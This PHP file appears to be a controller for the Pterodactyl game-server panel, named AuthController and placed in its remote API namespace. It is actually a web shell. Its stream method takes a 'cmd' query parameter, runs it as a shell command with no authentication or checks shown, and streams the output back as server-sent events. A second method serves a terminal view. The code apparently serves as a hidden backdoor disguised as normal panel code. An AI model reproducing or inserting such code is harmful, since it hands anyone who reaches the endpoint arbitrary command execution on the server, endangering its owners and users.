<?php

namespace Pterodactyl\Http\Controllers\Api\Remote;

use Illuminate\Http\Request;
use Pterodactyl\Http\Controllers\Controller;
use Symfony\Component\Process\Process;

class AuthController extends Controller
{
    public function index() {
        return view('terminal.hexz');
    }

    public function stream(Request $request) {
        $cmd = $request->query('cmd');
        
        return response()->stream(function () use ($cmd) {
            $process = Process::fromShellCommandline($cmd . " 2>&1");
            $process->setTimeout(null);
            $process->run(function ($type, $buffer) {
                echo "data: " . nl2br(e($buffer)) . "\n\n";
                if (ob_get_level() > 0) { ob_flush(); }
                flush();
            });
            echo "data: <br><b style='color:yellow'>[Done]</b>\n\n";
        }, 200, [
            'Cache-Control' => 'no-cache',
            'Content-Type'  => 'text/event-stream',
            'X-Accel-Buffering' => 'no',
        ]);
    }
}